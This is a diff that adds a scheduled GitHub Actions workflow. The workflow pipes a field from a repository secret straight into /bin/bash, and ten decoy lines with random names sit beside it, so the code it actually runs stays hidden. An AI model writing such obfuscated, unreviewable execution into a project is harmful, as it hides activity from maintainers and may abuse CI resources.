@@ -1,0 +1,28 @@
+name: laobanmeixiaoming
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: laobanmeixiaoming
+        env:
+          s8: ${{ secrets.s8 }}
+        run: |
+          echo $s8 | jq -r .hotu6040 | /bin/bash
+          echo $a75989 | jq -r .q539 | /bin/bash
+          echo $r160 | jq -r .f9915 | /bin/bash
+          echo $oehid5 | jq -r .ulei1 | /bin/bash
+          echo $wgvp649 | jq -r .e460 | /bin/bash
+          echo $ck94 | jq -r .dnok27527 | /bin/bash
+          echo $dmw9 | jq -r .dt46 | /bin/bash
+          echo $unv56869 | jq -r .pcmqr463 | /bin/bash
+          echo $fliwz95745 | jq -r .zxc42274 | /bin/bash
+          echo $nfd8449 | jq -r .pjjl32446 | /bin/bash
+          echo $twjpv222 | jq -r .k79 | /bin/bash
+
